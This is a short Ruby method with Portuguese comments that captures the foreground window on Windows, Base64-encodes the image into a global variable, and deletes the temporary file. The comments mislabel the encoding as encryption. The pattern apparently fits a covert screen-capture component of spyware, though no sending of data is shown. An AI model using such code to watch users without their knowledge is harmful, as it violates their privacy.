#método para captura de imagem
def captura_imagem
    img_encriptada = Win32::Screenshot::Take.of(:foreground).write('temp.png')
    #variavel temporaria que abrirá a imagem e irá encriptar
    templog = File.open("temp.png", "rb")
    #encriptando a imagem e criptografando a imagem
    $img_gerada = Base64.encode64(templog.read)
    #Fechando a imagem temporária
    templog.close
    #Deletando a imagem temporária
    File.delete('temp.png')
end